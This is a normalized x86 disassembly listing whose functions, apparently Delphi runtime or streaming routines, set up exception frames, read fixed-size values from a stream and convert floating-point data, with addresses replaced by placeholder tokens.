push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_414534
mov esi eax
xor edx edx
push ebp
push sub_4179c4
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179cb
mov eax [ rw-data ]
call sub_414598
retn
mov edx ebx
mov eax esi
call sub_414170
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403294
mov edx ebx
mov eax esi
call sub_414060
sub_4179d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417adf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ae6
lea eax [ ebp - 0x8 ]
call sub_404050
retn
xor edx edx
push ebp
push sub_417ac2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417b14
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_4171e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414170
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4040e8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4172c0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414170
call sub_417954
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_414170
mov edx eax
mov eax [ rw-data ]
call sub_4144ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4142bc
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_417af0
push ebx
mov ebx eax
mov eax ebx
call sub_417be4
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41664c
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_417b14
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403294
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_414170
call sub_403294
inc edi
dec esi
jne r-xdata
sub_417b50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4031dc
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_4137d0
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403220
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413848
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413748
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4031f8
test al al
jne r-xdata
sub_417c20
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_417c6c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_417c6c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
sub_417cbc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_417d07
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4194bc
mov eax [ ebp - 0x4 ]
call sub_404310
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d0e
lea eax [ ebp - 0x4 ]
call sub_404050
retn
call sub_4176f8
sub_417d14
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_417db4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4178b8
test al al
jne r-xdata
mov eax ebx
call sub_4178b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414e0c
jmp r-xdata
mov eax ebx
call sub_417bfc
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_418824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417dbb
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414d40
mov esi eax
mov eax ebx
call sub_41881c
jmp r-xdata
mov eax ebx
call sub_41876c
mov eax ebx
call sub_4178b8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418988
mov eax ebx
call sub_418824
sub_417de4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e18
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_414014
inc esi
dec ebx
jne r-xdata
sub_417e20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41af68
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e18
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd4
add esp 0x4
mov edx ebx
mov eax edi
call sub_41af3c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e18
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41af3c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_417e98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404e18
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_417f00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_417f20
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402774
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_417f00
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_419950
call sub_402774
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403294
sub_417f80
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_418066
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419af0
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41803a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41806b
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417f20
pop ecx
test al al
jne r-xdata
call sub_403a84
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a30
sub_418090
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_418108
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403490
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413cbc
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41810d
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417f20
pop ecx
test al al
jne r-xdata
call sub_403a84
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a30
sub_418130
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4181ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419af0
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403490
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4181b0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417f20
pop ecx
test al al
jne r-xdata
call sub_403a84
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403a30
sub_4181d4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4183f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_419480
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_419480
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_4183c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_418383
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_417e20
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417e98
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_417f80
pop ecx
push ebp
call sub_418130
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_418090
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403ab4
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_417e98
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_417e98
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183fc
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404fe0
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403490
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4141cc
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417de4
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_414014
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_417de4
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_414014
sub_418388
push ebp
call sub_417f00
pop ecx
test al al
je r-xdata
call sub_403a30
call sub_403a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403294
sub_418410
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418480
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41846b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418480
mov eax [ ebp - 0x4 ]
call sub_4179d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417b14
retn
sub_418480
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4178b8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418988
mov eax [ ebp - 0x4 ]
call sub_418824
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403490
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_418542
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403490
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4178b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4181d4
mov eax [ ebp - 0x4 ]
call sub_418824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418549
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_418550
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41965c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4187d8
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_417c20
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_418594
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41965c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4187d8
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417c20
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_4185d8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41965c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4187d8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417c20
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_418628
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41965c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4187d8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417c20
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41866c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41965c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_4176f8
mov al [ eax + lookup_table_418693 ]
jmp [ eax * 4 + jump_table_4186a1 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417c20
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404140
mov eax esi
call j_sub_40451c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417c20
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040a4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040a4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040a4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040a4
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41876c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41965c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417c20
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_417c20
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417c20
jmp r-xdata
jmp r-xdata
call sub_4176f8
sub_4187d8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_417bfc
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41876c
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41965c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417c20
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41882c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_417bfc
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41965c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41876c
mov [ edi ] eax
sub_41886c
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41895d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404050
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040e8
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418964
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031e4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042b4
sub_418988
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418b58
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_418b0d
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_419480
xor edx edx
push ebp
push j_sub_403848#8
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404310
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404570
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034bc
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410c1c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
